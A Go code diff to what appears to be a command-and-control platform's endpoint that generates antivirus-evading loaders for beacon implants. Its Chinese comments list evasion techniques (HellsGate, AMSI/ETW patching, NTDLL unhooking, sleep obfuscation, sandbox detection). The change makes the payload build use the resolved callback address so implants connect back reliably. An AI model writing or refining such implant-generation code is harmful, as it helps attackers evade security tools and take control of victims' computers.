@@ -34,7 +34,7 @@ var evasionTechniques = map[string]struct{ Path, Label, PayloadFormat string }{
 	// 加载 Go PE 不可靠（Go runtime 在 donut 加载器内无法启动），此型最稳。
 	"t0_drop":    {"evasion/templates/technique0/loader.go", "稳定：内嵌加密 beacon→解密落临时目录随机名→执行（回连最可靠）", "amd64_exe"},
 	"t1_classic": {"evasion/templates/technique1/loader.go", "经典：HellsGate+DoubleXOR+IPv4+ETW/AMSI补丁+NTDLL脱钩", "shellcode"},
-	"t3_sleep":   {"evasion/templates/technique3/loader.go", "强免杀：+VEH保护+睡眠混淆+深度沙箱检测+行为延迟", "shellcode"},
+	"t3_sleep":   {"evasion/templates/technique3/loader.go", "强免杀：+VEH保护+睡眠混淆+深度沙箱检测+行为延迟", "amd64_exe"},
 }
 
 // POST /api/tools/c2/loader-generate — 免杀加载器一键生成。
@@ -63,11 +63,6 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	}
 	// ① donut PIC shellcode + listener 信息（trailer cfg 自组——donut 只加载 PE 段，
 	// 基座尾部 trailer 会丢失；loader 运行时把配置追加到自身文件尾供 beacon 自读）
-	pic, _, err := c2Client().GeneratePayload(r.Context(), b.ListenerID, tech.PayloadFormat, b.Server)
-	if err != nil {
-		writeErr(w, 502, "goc2 载荷生成失败: "+err.Error())
-		return
-	}
 	lis := s.listenerInfo(b.ListenerID)
 	// 回连地址优先级：用户指定 > 请求 Host（用户访问平台的地址，物理机可达）>
 	// listener bind 地址。listener host 常为 0.0.0.0（绑定地址非回连地址）——
@@ -89,6 +84,11 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	// 需要显式值——兜底取请求 Host
 	if server == "" {
 		server = r.Host
+	}
+	pic, _, err := c2Client().GeneratePayload(r.Context(), b.ListenerID, tech.PayloadFormat, server)
+	if err != nil {
+		writeErr(w, 502, "goc2 载荷生成失败: "+err.Error())
+		return
 	}
 	enc := "aes"
 	if lis != nil {
